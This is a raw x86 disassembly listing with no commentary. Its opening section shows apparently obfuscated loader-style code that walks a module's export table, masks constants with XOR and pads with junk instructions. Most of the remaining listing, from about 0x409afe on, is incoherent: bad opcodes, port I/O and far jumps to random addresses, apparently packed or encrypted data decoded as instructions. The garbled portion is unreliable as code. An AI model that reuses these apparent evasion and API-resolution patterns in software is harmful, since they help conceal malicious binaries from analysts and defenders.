  40988d:	call   DWORD PTR ds:0x4348bb
  409893:	jmp    0x409856
  409898:	mov    DWORD PTR [ebp-0x2c],ecx
  40989b:	adc    eax,eax
  40989d:	mov    eax,DWORD PTR [ebp-0x14]
  4098a0:	sbb    ecx,DWORD PTR ds:0x432010
  4098a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4098a9:	xor    DWORD PTR ds:0x42e01c,0x42f000
  4098b3:	add    ecx,DWORD PTR [eax+0x24]
  4098b6:	dec    eax
  4098b7:	mov    DWORD PTR [ebp-0x34],ecx
  4098ba:	sbb    eax,ecx
  4098bc:	mov    eax,DWORD PTR [ebp-0x14]
  4098bf:	or     ecx,DWORD PTR ds:0x42e01c
  4098c5:	mov    ecx,DWORD PTR [ebp+0x8]
  4098c8:	xor    DWORD PTR ds:0x431018,0x773f
  4098d2:	add    ecx,DWORD PTR [eax+0x1c]
  4098d5:	mov    DWORD PTR ds:0x430008,0x460
  4098df:	mov    DWORD PTR [ebp-0x14],ecx
  4098e2:	mov    DWORD PTR ds:0x43000c,0x4e44
  4098ec:	jmp    0x4099d4
  4098f1:	mov    eax,DWORD PTR [ebp-0x2c]
  4098f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4098f7:	add    ecx,DWORD PTR [eax+ebx*4]
  4098fa:	or     DWORD PTR ds:0x42e000,0x7cb4
  409904:	mov    DWORD PTR [ebp-0x28],ecx
  409907:	and    DWORD PTR ds:0x43101c,0x0
  409911:	jmp    0x409925
  409916:	xor    ecx,ecx
  409918:	or     ecx,DWORD PTR ds:0x43101c
  40991e:	inc    ecx
  40991f:	mov    DWORD PTR ds:0x43101c,ecx
  409925:	cmp    DWORD PTR ds:0x43101c,0x16
  40992c:	jae    0x40998a
  409932:	cmp    DWORD PTR ds:0x43101c,0x4
  409939:	ja     0x40998a
  40993f:	jmp    0x40996b
  409944:	push   0x430018
  409949:	push   0x748b
  40994e:	push   DWORD PTR [ebp-0xc]
  409951:	push   0x836d
  409956:	push   0x5d47
  40995b:	push   0x5d0d
  409960:	push   0x3519
  409965:	call   DWORD PTR ds:0x4348e7
  40996b:	cmp    DWORD PTR ds:0x43101c,0x3
  409972:	jne    0x409985
  409978:	mov    ecx,DWORD PTR ds:0x43101c
  40997e:	inc    ecx
  40997f:	mov    DWORD PTR ds:0x43101c,ecx
  409985:	jmp    0x409916
  40998a:	mov    eax,DWORD PTR [ebp-0x4]
  40998d:	mov    ecx,DWORD PTR [ebp-0x28]
  409990:	xor    eax,esi
  409992:	add    eax,edi
  409994:	cmp    ecx,eax
  409996:	je     0x4099d4
  40999c:	jmp    0x4099c5
  4099a1:	mov    eax,DWORD PTR [ebp-0x4]
  4099a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4099a7:	xor    eax,esi
  4099a9:	add    eax,edi
  4099ab:	cmp    ecx,eax
  4099ad:	mov    eax,DWORD PTR [ebp-0x4]
  4099b0:	je     0x409a0f
  4099b6:	mov    ecx,DWORD PTR [ebp-0x30]
  4099b9:	xor    eax,esi
  4099bb:	add    eax,edi
  4099bd:	cmp    ecx,eax
  4099bf:	je     0x409a18
  4099c5:	lea    eax,[ebp-0x8]
  4099c8:	push   eax
  4099c9:	push   DWORD PTR [ebp-0x28]
  4099cc:	push   DWORD PTR [ebp+0xc]
  4099cf:	call   0x41112c
  4099d4:	mov    eax,DWORD PTR [ebp-0x4]
  4099d7:	mov    ecx,DWORD PTR [ebp-0x8]
  4099da:	xor    eax,esi
  4099dc:	add    eax,edi
  4099de:	cmp    ecx,eax
  4099e0:	je     0x4099fb
  4099e6:	mov    eax,DWORD PTR [ebp-0x34]
  4099e9:	movzx  eax,WORD PTR [eax+ebx*2]
  4099ed:	mov    ecx,DWORD PTR [ebp-0x14]
  4099f0:	mov    eax,DWORD PTR [ecx+eax*4]
  4099f3:	mov    DWORD PTR [ebp-0x38],eax
  4099f6:	jmp    0x4099a1
  4099fb:	mov    eax,DWORD PTR [ebp-0xc]
  4099fe:	xor    eax,esi
  409a00:	lea    ebx,[ebx+eax*1+0x3272e4]
  409a07:	jmp    0x4096f7
  409a0c:	mov    eax,DWORD PTR [ebp-0x4]
  409a0f:	xor    eax,esi
  409a11:	add    eax,edi
  409a13:	jmp    0x40e27b
  409a18:	mov    eax,DWORD PTR [ebp-0x38]
  409a1b:	add    eax,DWORD PTR [ebp+0x8]
  409a1e:	mov    DWORD PTR [ebp-0x18],eax
  409a21:	mov    eax,DWORD PTR [ebp-0x1c]
  409a24:	test   eax,eax
  409a26:	je     0x409ac0
  409a2c:	mov    DWORD PTR [ebp-0x20],0x0
  409a33:	push   0x3
  409a35:	xor    edx,edx
  409a37:	pop    edx
  409a38:	add    edx,0x8
  409a3b:	push   edx
  409a3c:	pop    ecx
  409a3d:	push   0x6
  409a3f:	dec    ecx
  409a40:	pop    ebx
  409a41:	dec    ebx
  409a42:	xchg   ebx,ecx
  409a44:	sub    ebx,ecx
  409a46:	xchg   ebx,ecx
  409a48:	dec    ecx
  409a49:	mov    eax,DWORD PTR [ebp-0x1c]
  409a4c:	imul   eax,ecx
  409a4f:	sub    esp,eax
  409a51:	mov    DWORD PTR [ebp-0x20],esp
  409a54:	mov    eax,DWORD PTR [ebp-0x4]
  409a57:	xor    eax,esi
  409a59:	add    eax,edi
  409a5b:	jmp    0x409a99
  409a60:	mov    ecx,DWORD PTR [ebp-0xc]
  409a63:	mov    eax,DWORD PTR [ebp+0x8]
  409a66:	mov    edx,DWORD PTR [ebp+0x14]
  409a69:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  409a6d:	xor    ecx,esi
  409a6f:	add    ecx,edi
  409a71:	xor    edx,edx
  409a73:	div    ecx
  409a75:	mov    ecx,DWORD PTR [ebp-0x4]
  409a78:	xor    ecx,esi
  409a7a:	lea    eax,[ecx+eax*1+0x3272e4]
  409a81:	mov    ecx,DWORD PTR [ebp+0x8]
  409a84:	mov    edx,DWORD PTR [ebp-0x20]
  409a87:	mov    DWORD PTR [edx+ecx*4],eax
  409a8a:	mov    eax,DWORD PTR [ebp-0xc]
  409a8d:	mov    ecx,DWORD PTR [ebp+0x8]
  409a90:	xor    eax,esi
  409a92:	lea    eax,[eax+ecx*1+0x3272e4]
  409a99:	mov    DWORD PTR [ebp+0x8],eax
  409a9c:	mov    eax,DWORD PTR [ebp-0xc]
  409a9f:	mov    ecx,DWORD PTR [ebp+0x14]
  409aa2:	xor    eax,esi
  409aa4:	add    eax,edi
  409aa6:	imul   eax,DWORD PTR [ecx]
  409aa9:	mov    ecx,DWORD PTR [ebp-0x4]
  409aac:	mov    edx,DWORD PTR [ebp+0x8]
  409aaf:	xor    ecx,esi
  409ab1:	lea    ecx,[ecx+edx*1+0x3272e4]
  409ab8:	cmp    ecx,eax
  409aba:	jne    0x409a60
  409ac0:	mov    eax,DWORD PTR [ebp-0x4]
  409ac3:	xor    eax,esi
  409ac5:	add    eax,edi
  409ac7:	mov    DWORD PTR [ebp-0x10],eax
  409aca:	mov    ebx,0x65655
  409acf:	add    ebx,0x3234
  409ad5:	xchg   ebx,esi
  409ad7:	xor    ebx,ebx
  409ad9:	push   esi
  409ada:	mov    esi,ebx
  409adc:	pop    ebx
  409add:	mov    edx,esi
  409adf:	add    ebx,0x1002
  409ae5:	lea    eax,[ebp-0x18]
  409ae8:	add    edx,eax
  409aea:	add    edx,0x5
  409aed:	push   edx
  409aee:	inc    esi
  409aef:	pop    ecx
  409af0:	dec    ecx
  409af1:	xchg   ecx,eax
  409af2:	dec    eax
  409af3:	xchg   ecx,eax
  409af4:	dec    ecx
  409af5:	xchg   ecx,edx
  409af7:	dec    edx
  409af8:	push   edx
  409af9:	jmp    0x40be9c
  409afe:	retf   
  409aff:	sbb    BYTE PTR [edi-0x75],dh
  409b02:	ja     0x409b77
  409b04:	mov    bl,0x18
  409b06:	sbb    DWORD PTR [esi+esi*1+0x53],ebp
  409b0a:	popf   
  409b0b:	in     eax,dx
  409b0c:	jl     0x409ac4
  409b0e:	dec    esi
  409b0f:	add    al,0x72
  409b11:	jb     0x409b0b
  409b13:	pop    edi
  409b14:	jb     0x409b88
  409b16:	fs sub al,0xff
  409b19:	jno    0x409b11
  409b1b:	stos   DWORD PTR es:[edi],eax
  409b1c:	lods   al,BYTE PTR ds:[esi]
  409b1d:	cmp    eax,0xb202c7d4
  409b22:	xchg   edi,eax
  409b23:	jb     0x409b5d
  409b25:	into   
  409b26:	pop    eax
  409b27:	mov    edx,DWORD PTR [ebx+0x3094e118]
  409b2d:	popf   
  409b2e:	cld    
  409b2f:	dec    ebx
  409b30:	sub    DWORD PTR ds:0x4ecb25ad,edx
  409b36:	push   cs
  409b37:	or     al,0x84
  409b39:	sub    BYTE PTR [edi+eax*8],dl
  409b3c:	mov    ds:0xcb83ad3b,al
  409b41:	xchg   ecx,eax
  409b42:	mov    ah,0xfe
  409b44:	clc    
  409b45:	lods   eax,DWORD PTR ds:[esi]
  409b46:	pop    eax
  409b47:	int    0x4e
  409b49:	sbb    bl,BYTE PTR [ebp+0x3d]
  409b4c:	pop    ebx
  409b4d:	aaa    
  409b4e:	cdq    
  409b4f:	div    esi
  409b51:	pop    es
  409b52:	or     eax,0x8ca5f52e
  409b57:	mov    eax,ds:0xfd28e370
  409b5c:	jbe    0x409b32
  409b5e:	push   edi
  409b5f:	adc    esi,ebx
  409b61:	sub    al,0x53
  409b63:	stc    
  409b64:	clc    
  409b65:	fwait
  409b66:	jo     0x409b02
  409b68:	adc    dl,BYTE PTR [edi-0x39]
  409b6b:	and    ch,BYTE PTR [ebx+eax*2-0x7e4d34e3]
  409b72:	pop    ecx
  409b73:	aaa    
  409b74:	ja     0x409bea
  409b76:	jno    0x409b7b
  409b78:	maxps  xmm1,XMMWORD PTR ds:0x9f524fb8
  409b7f:	in     al,0x76
  409b81:	ss xchg ebx,eax
  409b83:	dec    esi
  409b84:	dec    eax
  409b85:	arpl   WORD PTR [esp+esi*8],sp
  409b88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b89:	outs   dx,DWORD PTR ds:[esi]
  409b8a:	pusha  
  409b8b:	mov    esp,0xd2f4161b
  409b90:	movups XMMWORD PTR [edi-0x383412d3],xmm7
  409b97:	cmp    DWORD PTR [eax-0x66],esp
  409b9a:	add    BYTE PTR [ebp-0x11],bh
  409b9d:	pop    esp
  409b9e:	stos   BYTE PTR es:[edi],al
  409b9f:	lahf   
  409ba0:	stos   BYTE PTR es:[edi],al
  409ba1:	mul    BYTE PTR [ebx+0x3a]
  409ba4:	mov    ds:0x1be49292,eax
  409ba9:	in     eax,0x1d
  409bab:	mov    DWORD PTR [ecx+eiz*1+0x59],edx
  409baf:	imul   esi,DWORD PTR [esi],0x5aad7507
  409bb5:	dec    esi
  409bb6:	jmp    0x687aa66c
  409bbb:	cli    
  409bbc:	gs iret 
  409bbe:	push   0xfc8bb18e
  409bc3:	mov    esp,0x48138c26
  409bc8:	xchg   ebp,eax
  409bc9:	fild   QWORD PTR [ecx-0x227065e5]
  409bcf:	inc    eax
  409bd0:	xchg   esi,eax
  409bd1:	out    dx,al
  409bd2:	xchg   esi,eax
  409bd3:	ret    
  409bd4:	sbb    dl,BYTE PTR [ecx-0x1f]
  409bd7:	mov    ds:0xbcf16538,al
  409bdc:	push   0xfbe52b67
  409be1:	pop    esp
  409be2:	and    BYTE PTR [ebx+esi*1-0x2d],cl
  409be6:	xchg   ebx,eax
  409be7:	cmp    al,0x3a
  409be9:	add    DWORD PTR [ebx+0x9],ecx
  409bec:	xor    DWORD PTR ds:0x1381e050,ebx
  409bf3:	push   es
  409bf4:	push   ebp
  409bf5:	cmp    bl,ah
  409bf7:	mov    BYTE PTR [edi+0x7eec1156],bh
  409bfd:	adc    DWORD PTR [edx],0x19
  409c00:	mov    WORD PTR [edx-0x1693bbd6],es
  409c06:	data16 scas al,BYTE PTR es:[edi]
  409c08:	cmp    DWORD PTR [esi+0x71],esi
  409c0b:	call   0xa2b62a6c
  409c10:	cdq    
  409c11:	mov    ds:0xc5c85b02,al
  409c16:	add    eax,0xdc1788da
  409c1b:	lahf   
  409c1c:	lock mov bl,0x27
  409c1f:	nop
  409c20:	out    dx,eax
  409c21:	lea    esi,[ebx-0x6f]
  409c24:	sbb    al,0x54
  409c26:	push   ebx
  409c27:	sbb    esi,edx
  409c29:	pop    esi
  409c2a:	popf   
  409c2b:	pop    es
  409c2c:	retf   0x293
  409c2f:	fnsave [ebx-0x10b26044]
  409c35:	adc    al,0x2b
  409c37:	mov    ah,0x1f
  409c39:	lahf   
  409c3a:	or     al,0x8e
  409c3c:	fs (bad) 
  409c3e:	int3   
  409c3f:	lds    ebx,FWORD PTR [ebx+0x31]
  409c42:	cli    
  409c43:	inc    edi
  409c44:	add    DWORD PTR [esi+0x36],0x17
  409c48:	push   ss
  409c49:	add    BYTE PTR [edi+0x66fcd09],0x6
  409c50:	push   ecx
  409c51:	xchg   esi,eax
  409c52:	sub    ah,BYTE PTR [edx-0x321b5d2e]
  409c58:	mov    ds:0x53cffb70,al
  409c5d:	mov    ebp,0xe4127377
  409c62:	stos   DWORD PTR es:[edi],eax
  409c63:	add    al,BYTE PTR [ecx]
  409c65:	jne    0x409c49
  409c67:	aam    0xe2
  409c69:	and    al,0xf3
  409c6b:	dec    ecx
  409c6c:	test   ebx,ebp
  409c6e:	fnsave [edi-0x2a208ffb]
  409c74:	rcl    BYTE PTR ds:[edx],1
  409c77:	push   ebx
  409c78:	call   0xa6d7:0xc00b7e62
  409c7f:	(bad)  
  409c80:	int    0x6a
  409c82:	mov    dh,0x8a
  409c84:	mov    es,WORD PTR [eax]
  409c86:	test   DWORD PTR [ecx-0x3754d993],ebx
  409c8c:	inc    BYTE PTR [ebp-0xa]
  409c8f:	jle    0x409c2e
  409c91:	pushf  
  409c92:	or     cl,BYTE PTR [esi+ebx*8]
  409c95:	mov    esi,0x2ac7982a
  409c9a:	mov    dl,0x73
  409c9c:	jle    0x409d1b
  409c9e:	xchg   ecx,eax
  409c9f:	add    bl,dh
  409ca1:	add    eax,edx
  409ca3:	push   esi
  409ca4:	push   esp
  409ca5:	jcxz   0x409c4b
  409ca8:	(bad)
  409cab:	jno    0x409c90
  409cad:	jb     0x409cbc
  409caf:	inc    ebx
  409cb0:	imul   esp,DWORD PTR [ecx-0x58],0xffffffa6
  409cb4:	xchg   esp,eax
  409cb5:	pop    ebx
  409cb6:	sub    BYTE PTR cs:[ebx+edx*4+0x13],al
  409cbb:	repz sbb al,0x4e
  409cbe:	mov    ds:0x7d6f2a82,eax
  409cc3:	retf   
  409cc4:	fwait
  409cc5:	mov    edi,0x6b4259d3
  409cca:	fild   DWORD PTR [ecx]
  409ccc:	sub    eax,0xbeb803be
  409cd1:	pop    eax
  409cd2:	das    
  409cd3:	cmp    al,0x14
  409cd5:	add    eax,0xa9551ce0
  409cda:	pop    ss
  409cdb:	push   0xe704b841
  409ce0:	mov    edx,0x95f60fd4
  409ce5:	mov    al,ds:0x1ae5c181
  409cea:	pop    esp
  409ceb:	jmp    0x409c71
  409ced:	jecxz  0x409d31
  409cef:	sbb    al,0xff
  409cf1:	xor    dl,BYTE PTR [ebx+0x1b]
  409cf4:	mov    eax,ds:0x4b40b9db
  409cf9:	test   bh,bh
  409cfb:	call   0x6efb6e7f
  409d00:	mov    eax,ds:0x34e35131
  409d05:	sbb    DWORD PTR [ecx-0x29529f02],edi
  409d0b:	add    ecx,DWORD PTR [ebx+0x9]
  409d0e:	(bad)  
  409d10:	sahf   
  409d11:	mov    DWORD PTR [edi+0x4b],edx
  409d14:	rcl    ah,1
  409d16:	or     al,0xc3
  409d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d19:	(bad)  
  409d1a:	push   ds
  409d1b:	and    DWORD PTR [eax-0x2e],edi
  409d1e:	push   0xc00d7d14
  409d23:	pop    ss
  409d24:	(bad)  
  409d25:	enter  0x5904,0xa3
  409d29:	dec    eax
  409d2a:	mov    edx,edx
  409d2c:	pop    eax
  409d2d:	push   ebx
  409d2e:	dec    eax
  409d2f:	cld    
  409d30:	ret    0x34d9
  409d33:	popf   
  409d34:	arpl   WORD PTR [ebx],cx
  409d36:	adc    ebp,DWORD PTR [edi]
  409d38:	test   eax,0x36d7483c
  409d3d:	jl     0x409d71
  409d3f:	jne    0x409d6e
  409d41:	adc    cl,BYTE PTR [ebp-0x66d0d268]
  409d47:	(bad)  
  409d48:	mov    edx,0x1532962c
  409d4d:	adc    eax,0x7be6f0c
  409d52:	imul   esp,edi,0x936bed31
  409d58:	mov    ecx,0x76782dde
  409d5d:	inc    esi
  409d5e:	push   0x7847c9d1
  409d63:	or     al,0x4
  409d65:	adc    al,0x28
  409d67:	out    dx,al
  409d68:	fcom   QWORD PTR cs:[eax-0x24]
  409d6c:	pop    ebp
  409d6d:	sbb    dl,BYTE PTR es:[ecx-0x3229f5a3]
  409d74:	push   cs
  409d75:	div    ah
  409d77:	mov    ch,0x49
  409d79:	jae    0x409cfc
  409d7b:	popa   
  409d7c:	and    eax,0xe7e17be2
  409d81:	fnclex 
  409d83:	inc    ebp
  409d84:	fwait
  409d85:	ror    DWORD PTR [ecx+esi*1+0x60],cl
  409d89:	or     BYTE PTR [ebp+0x797aaa98],bl
  409d8f:	outs   dx,DWORD PTR ds:[esi]
  409d90:	cmp    BYTE PTR [eax-0xe],ch
  409d93:	(bad)  
  409d94:	sub    eax,0x8b5c59d5
  409d99:	jno    0x409db5
  409d9b:	mov    bl,0xe4
  409d9d:	pusha  
  409d9e:	pop    ss
  409d9f:	and    eax,0x92ae46cf
  409da4:	push   ds
  409da5:	stos   BYTE PTR es:[edi],al
  409da6:	sub    dl,BYTE PTR [ebx+0x68982d06]
  409dac:	out    dx,eax
  409dad:	sub    DWORD PTR [eax-0x172c048d],0x315a238b
  409db7:	sub    eax,0x5fff6013
  409dbc:	sub    DWORD PTR [ecx+esi*8],edi
  409dbf:	xlat   BYTE PTR ds:[ebx]
  409dc0:	retf   0x227d
  409dc3:	stos   BYTE PTR es:[edi],al
  409dc4:	stc    
  409dc5:	push   esp
  409dc6:	inc    esp
  409dc7:	adc    al,0xa1
  409dc9:	mov    ss,WORD PTR [edi+0x25b69c79]
  409dcf:	xlat   BYTE PTR ds:[ebx]
  409dd0:	mov    DWORD PTR [esi+esi*1+0x7ae47b98],eax
  409dd7:	cdq    
  409dd8:	test   BYTE PTR [eax+eiz*2-0xfd3ab4a],ah
  409ddf:	jle    0x409d7d
  409de1:	push   esp
  409de2:	xor    al,0x8c
  409de4:	mov    dh,0x48
  409de6:	inc    eax
  409de7:	pop    esp
  409de8:	sub    BYTE PTR [ebp+0x33a30063],dl
  409dee:	ret    0x8d88
  409df1:	(bad)  
  409df2:	loopne 0x409e5a
  409df4:	ins    BYTE PTR es:[edi],dx
  409df5:	aaa    
  409df6:	shl    BYTE PTR [edx+0x1b],cl
  409df9:	mov    DWORD PTR [ebx+ebp*4],0xac95e42c
  409e00:	fisubr DWORD PTR [esi]
  409e03:	xchg   edi,eax
  409e04:	mov    esp,0xad69b90a
  409e09:	es mov ebx,0x3bc3540a
  409e0f:	inc    eax
  409e10:	mov    bl,0x87
  409e12:	iret   
  409e13:	imul   ebp,DWORD PTR [eax-0x48],0x2
  409e17:	ret    
  409e18:	popf   
  409e19:	xor    bl,al
  409e1b:	out    dx,al
  409e1c:	push   es
  409e1d:	adc    DWORD PTR [ebp-0x3b],edi
  409e20:	xor    dh,dl
  409e22:	int    0xfb
  409e24:	cmp    bl,BYTE PTR [edi+0x48144bf5]
  409e2a:	xor    al,0x7
  409e2c:	or     bl,BYTE PTR [edx+0x6db09d3d]
  409e32:	lods   eax,DWORD PTR ds:[esi]
  409e33:	out    0xba,eax
  409e35:	or     BYTE PTR [esi+0xd6d546e],bl
  409e3b:	or     ah,BYTE PTR [ecx]
  409e3d:	and    esi,edi
  409e3f:	xchg   esp,eax
  409e40:	push   edi
  409e41:	addr16 das 
  409e43:	pop    esp
  409e44:	mov    ch,0xee
  409e46:	ror    WORD PTR [ebp+edx*4+0x7ae13215],0x26
  409e4f:	in     al,0xf2
  409e51:	sub    DWORD PTR [edx-0x34],ebp
  409e54:	xchg   ebp,eax
  409e55:	lea    edx,[esp+eax*1-0x6734e261]
  409e5c:	jae    0x409df9
  409e5e:	pop    ebp
  409e5f:	mov    ebp,0xea2ea668
  409e64:	and    esi,DWORD PTR [ebx+edx*4-0x7f]
  409e68:	push   ecx
  409e69:	mov    dl,0x56
  409e6b:	jmp    0x2e582140
  409e70:	es aas 
  409e72:	aas    
  409e73:	mov    BYTE PTR [ecx-0x3e],dh
  409e76:	mov    dl,bl
  409e78:	lock push cs
  409e7a:	stos   BYTE PTR es:[edi],al
  409e7b:	mul    DWORD PTR [eax-0x6b]
  409e7e:	pop    esp
  409e7f:	or     BYTE PTR [ebx+0x4b],al
  409e82:	scas   al,BYTE PTR es:[edi]
  409e83:	add    al,0x78
  409e85:	push   cs
  409e86:	cmp    DWORD PTR fs:[ebx+0x57],0xaf664f4d
  409e8e:	cmp    BYTE PTR [edx],al
  409e90:	dec    esi
  409e91:	push   edi
  409e92:	fdivr  DWORD PTR [ebp+0x369cc010]
  409e98:	dec    edx
  409e99:	repnz inc ebx
  409e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e9c:	dec    edx
  409e9d:	jp     0x409e61
  409e9f:	stos   DWORD PTR es:[edi],eax
  409ea0:	dec    esi
  409ea1:	xor    DWORD PTR [eax+edi*8],ebp
  409ea4:	jb     0x409e32
  409ea6:	push   esi
  409ea7:	push   esp
  409ea8:	xlat   BYTE PTR ds:[ebx]
  409ea9:	loope  0x409f18
  409eab:	sbb    eax,0x7a882e0b
  409eb0:	sbb    eax,0xbd70f3be
  409eb5:	arpl   WORD PTR [edi],bx
  409eb7:	stos   DWORD PTR es:[edi],eax
  409eb8:	and    DWORD PTR [edx],esi
  409eba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ebb:	sub    ah,BYTE PTR [ebp-0x3e5f6464]
  409ec1:	int3   
  409ec2:	sub    ch,ch
  409ec4:	mov    cs,WORD PTR [ebp+0x2990109e]
  409eca:	ss xor esi,ecx
  409ecd:	cmc    
  409ece:	cli    
  409ecf:	mov    edx,0xa0044fcd
  409ed4:	add    BYTE PTR [eax],0x42
  409ed7:	xchg   ecx,ebx
  409ed9:	mov    DWORD PTR [eax+0x3d],0x93bf65e0
  409ee0:	jo     0x409f4d
  409ee2:	in     eax,dx
  409ee3:	test   DWORD PTR [di+0x7e34],edx
  409ee8:	dec    ebp
  409ee9:	iret   
  409eea:	push   ecx
  409eeb:	dec    di
  409eed:	adc    al,bh
  409eef:	cdq    
  409ef0:	fimul  DWORD PTR [edi-0xa69457f]
  409ef6:	das    
  409ef7:	push   0xf31dd62c
  409efc:	in     eax,0x75
  409efe:	cdq    
  409eff:	jl     0x409e8f
  409f01:	inc    esp
  409f02:	adc    cl,BYTE PTR ds:0xa87a041a
  409f08:	test   al,0x88
  409f0a:	jmp    0x9830:0x2e194620
  409f11:	push   ecx
  409f12:	push   edi
  409f13:	push   edi
  409f14:	xor    esi,DWORD PTR [ebx+0x3855f3a1]
  409f1a:	jge    0x409e9e
  409f1c:	shl    DWORD PTR [eax+0x38ae439e],1
  409f22:	adc    dh,BYTE PTR [ebx+0x46819cb5]
  409f28:	and    al,0x1e
  409f2a:	inc    edx
  409f2b:	add    ah,BYTE PTR [ebp-0x3d5b7ae3]
  409f31:	sti    
  409f32:	xchg   DWORD PTR [ebp-0x20140fcc],ebx
  409f38:	ret    0x6152
  409f3b:	mov    BYTE PTR [ecx+0x3b],dl
  409f3e:	leave  
  409f3f:	(bad)  
  409f40:	push   esp
  409f41:	test   dh,0x35
  409f44:	call   0xeb74:0xeb0db713
  409f4b:	(bad)  
  409f4c:	jmp    0x409f0b
  409f4e:	xchg   ecx,eax
  409f4f:	pop    ebp
  409f50:	mov    ch,0x59
  409f52:	mov    edx,0xb49a82e5
  409f57:	je     0x409f01
  409f59:	(bad)  
  409f5a:	stc    
  409f5b:	das    
  409f5c:	xchg   esp,eax
  409f5d:	and    esp,0x12
  409f60:	xchg   ebx,eax
  409f61:	scas   al,BYTE PTR es:[edi]
  409f62:	adc    eax,0xe69fcec7
  409f67:	or     esi,DWORD PTR [ebx]
  409f69:	sbb    BYTE PTR [ebx+0x3e],0x4e
  409f6d:	inc    ebx
  409f6e:	cmp    ch,BYTE PTR [ecx+esi*2+0x11]
  409f72:	lahf   
  409f73:	rol    ah,0x35
  409f76:	adc    eax,DWORD PTR [eax+0x62]
  409f79:	sbb    BYTE PTR [edi+0x68],dl
  409f7c:	and    dl,ch
  409f7e:	mov    eax,ds:0xe836d582
  409f83:	into   
  409f84:	loope  0x409ff0
  409f86:	xchg   esi,eax
  409f87:	sbb    DWORD PTR [ecx+0x162c632b],esi
  409f8d:	syscall 
  409f8f:	push   ebp
  409f90:	xchg   ebp,eax
  409f91:	xchg   BYTE PTR [esi+0x38],ah
  409f94:	daa    
  409f95:	add    DWORD PTR [ebx+0x61],0x72
  409f99:	pop    esp
  409f9a:	xchg   ebp,eax
  409f9b:	adc    BYTE PTR [esi+0x107119e2],dh
  409fa1:	mov    edx,0x94a63253
  409fa6:	shl    DWORD PTR [ecx-0x164fcfff],0x52
  409fad:	dec    edi
  409fae:	js     0x409f69
  409fb0:	sbb    cl,BYTE PTR [edx+ebp*2-0x45]
  409fb4:	inc    esi
  409fb5:	add    esp,DWORD PTR [edi-0xe]
  409fb8:	hlt    
  409fb9:	xchg   esp,eax
  409fba:	cmp    BYTE PTR [ebx+0x4428bb12],cl
  409fc0:	mov    ds:0xcd8a8b8,eax
  409fc5:	xchg   DWORD PTR [edx+0x75df2a4c],esi
  409fcb:	ret    0x34c2
  409fce:	fistp  WORD PTR [edi+0xe959318]
  409fd4:	fdiv   st(3),st
  409fd6:	outs   dx,BYTE PTR ds:[esi]
  409fd7:	loopne 0x40a010
  409fd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fda:	mov    edx,0xc2cf6d4c
  409fdf:	fisubr WORD PTR [esp+ebx*8]
  409fe2:	push   ebx
  409fe3:	or     ebp,DWORD PTR [edx]
  409fe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fe6:	loop   0x409f90
  409fe8:	aas    
  409fe9:	lock jmp 0x9e5255da
  409fef:	xor    eax,0xeb2264a4
  409ff4:	sbb    DWORD PTR [edi+ebx*8+0x7db7c12f],0xa5664b8e
  409fff:	cmp    BYTE PTR [esp+eiz*2+0x76c3613d],ah
  40a006:	cli    
  40a007:	xchg   ebx,eax
  40a008:	pop    edi
  40a009:	inc    esp
  40a00a:	dec    ebp
  40a00b:	loope  0x40a05c
  40a00d:	fisub  DWORD PTR [ebx]
  40a00f:	scas   al,BYTE PTR es:[edi]
  40a010:	inc    si
  40a012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a013:	mov    cs,WORD PTR ds:0x46f25370
  40a019:	dec    edx
  40a01a:	xor    dh,ah
  40a01c:	jmp    0x79fec9b9
  40a021:	or     al,0x24
  40a023:	fstp   QWORD PTR [ebx+0x31e9e13c]
  40a029:	mov    al,0xa5
  40a02b:	push   ss
  40a02c:	mov    ebp,0x2e38363c
  40a031:	fbstp  TBYTE PTR [edx+0x73ddd986]
  40a037:	ret    
  40a038:	popa   
  40a039:	mov    dl,0xd3
  40a03b:	jmp    0x409fec
  40a03d:	xchg   edx,eax
  40a03e:	dec    ebx
  40a03f:	push   0xf82c4b74
  40a044:	push   edi
  40a045:	sti    
  40a046:	xchg   esp,eax
  40a047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a048:	in     eax,dx
  40a049:	in     eax,0x77
  40a04b:	test   DWORD PTR [edx-0xe],ebp
  40a04e:	or     BYTE PTR [eax+0x3d],cl
  40a051:	cmp    cl,al
  40a053:	xchg   ebx,eax
  40a054:	mov    ecx,0xe5e1fb16
  40a059:	je     0x40a077
  40a05b:	nop
  40a05c:	mov    eax,0x12813c3c
  40a061:	lds    ecx,FWORD PTR [edx+0x2126b73e]
  40a067:	cmp    al,dl
  40a069:	mov    ds:0x726fb3db,al
  40a06e:	aam    0xa5
  40a070:	dec    edx
  40a071:	hlt    
  40a072:	mov    bl,0x90
  40a074:	fwait
  40a075:	adc    ebx,esi
  40a077:	repnz pop es
  40a079:	ja     0x40a0f9
  40a07b:	out    dx,eax
  40a07c:	adc    DWORD PTR [eax-0x58],esi
  40a07f:	aas    
  40a080:	or     bh,ch
  40a082:	add    DWORD PTR [ebx-0x39375b79],edx
  40a088:	jge    0x40a0f0
  40a08a:	bound  ebp,QWORD PTR [ebp+0x18783a2b]
  40a090:	mov    al,ds:0x99239c0
  40a095:	jno    0x40a0c3
  40a097:	jbe    0x40a0d8
  40a099:	icebp  
  40a09a:	mov    al,0xe6
  40a09c:	ror    DWORD PTR [esi],1
  40a09e:	mov    ebp,0xba4017f4
  40a0a3:	cmp    ah,0x7c
  40a0a6:	pusha  
  40a0a7:	dec    esi
  40a0a8:	mov    esp,0xb3ca86d4
  40a0ad:	mov    WORD PTR [ebx-0x7559ca8c],?
  40a0b3:	fidiv  WORD PTR [edi-0x4e]
  40a0b6:	add    al,0x8f
  40a0b8:	fld    DWORD PTR [ebp-0x556a8727]
  40a0be:	mov    ds:0x5d7b5513,al
  40a0c3:	retf   
  40a0c4:	outs   dx,DWORD PTR ds:[esi]
  40a0c5:	cmp    BYTE PTR [edx+0x594358ac],dl
  40a0cb:	jl     0x40a146
  40a0cd:	rol    BYTE PTR [edi+ebp*4],0x52
  40a0d1:	mov    BYTE PTR [esi],bh
